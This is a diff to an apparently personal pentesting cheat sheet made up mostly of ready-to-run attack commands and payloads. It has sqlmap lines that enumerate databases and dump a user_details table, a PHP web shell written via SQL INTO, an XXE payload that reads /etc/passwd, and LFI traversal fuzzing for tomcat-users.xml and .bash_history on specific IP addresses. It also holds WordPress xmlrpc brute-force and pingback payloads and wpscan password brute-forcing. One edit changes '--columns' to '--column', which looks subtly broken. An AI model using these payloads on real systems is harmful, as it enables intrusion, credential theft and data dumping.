@@ -32,7 +32,7 @@ sqlmap -r request3.txt -p column_code,type  --ignore-code 401 --level 5 --risk 3
 
 python sqlmap.py  -r C:\Users\Dell\Desktop\request3.txt -p username,emailid --ignore-code 401 --level 5 --risk 3 --force-ssl --mobile --batch --dbs 
 
-python sqlmap.py  -r C:\Users\Dell\Desktop\request3.txt -p UserId,login_type --ignore-code 401 --proxy http://127.0.0.1:8080 -D PROD_QPORT_2 --tables
+python sqlmap.py  -r C:\Users\Dell\Desktop\request3.txt -p UserId,login_type --ignore-code 401 --proxy http://127.0.0.1:8080 -D users --tables
 
 #### Using tamper script
 python sqlmap.py  -r C:\Users\Dell\Desktop\request3.txt -p rowID --ignore-code 401 --level 5 --batch --tamper space2plus,space2comment,charencode
@@ -41,10 +41,10 @@ python sqlmap.py  -r C:\Users\Dell\Desktop\request3.txt -p rowID --ignore-code 4
 python sqlmap.py  -r C:\Users\Dell\Desktop\request3.txt -p title,content,author --level 2 --ignore-code 401 -D abcde --tables
 
 #### To browse through tables we use
-python sqlmap.py  -r C:\Users\Dell\Desktop\request3.txt -p email --level 2 --ignore-code 401 -D abcde -T user_details --columns
+python sqlmap.py  -r C:\Users\Dell\Desktop\request3.txt -p email --level 2 --ignore-code 401 -D abcde -T user_details --column
 
 #### To dump the data
-python sqlmap.py  -r C:\Users\Dell\Desktop\request3.txt -p email --level 2 --ignore-code 401 -D abcde -T user_details --dump
+python sqlmap.py  -r C:\Users\Dell\Desktop\request3.txt -p email --level 2 --ignore-code 401 -D abcde -T user_details --column --batch --dump
 
 ### RCE (create exploit war file)
 
@@ -60,6 +60,19 @@ SELECT "<html><body><?php echo system($_GET['command']); ?></body></html>" into 
 ### Exploit SQLi along with cracking pass
 
 python 46635.py -u http://10.10.146.189/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+
+### XXE Exploit
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+   <!ELEMENT data ANY >
+   <!ENTITY name SYSTEM "file:///etc/passwd" >]>
+<comment>
+  <name>&name;</name>
+  <author>DD</author>
+  <com>Just Articles</com>
+</comment>
+```
 
 ## Directly Download exploit and run it
 
@@ -99,5 +112,53 @@ bash 403-bypass.sh -u https://abc.in/.htaccess --exploit
 #### Fuzzing using LFI
 
 wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://49.186.149.89:8081/sh/download?file=../../../../../../../../../../../opt/tomcat/FUZZ/tomcat-users.xml | grep -v "0 L"
+
+wfuzz -u http://10.10.136.136:5000/api/v2/resources/books?FUZZ=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404  (change v2 to v1 or vice versa to find hidden injectable endpoints)
+
+## WordPress Pentesting
+
+```
+/wp-json/wp/v2/users
+/xmlrpc.php
+```
+List all methods
+```
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+```
+Brute Force Attack
+```
+<methodCall>
+<methodName>wp.getUsersBlogs</methodName>
+<params>
+<param><value>admin</value></param>
+<param><value>pass</value></param>
+</params>
+</methodCall>
+```
+XSPA Attack
+
+```
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params><param>
+<value><string>http://<YOUR SERVER >:<port></string></value>
+</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
+</value></param></params>
+</methodCall>
+```
+
+### WPScan Commands
+
+wpscan –url IP_ADDRESS_OF_WEBSITE
+
+wpscan –url IP_ADDRESS_OF_WEBSITE -e u  (enumerate users)
+
+wpscan –url IP_ADDRESS_OF_WEBSITE -U USER_NAME -P /usr/share/wordlists/rockyou.txt (BFA)
+
+
+
 
 
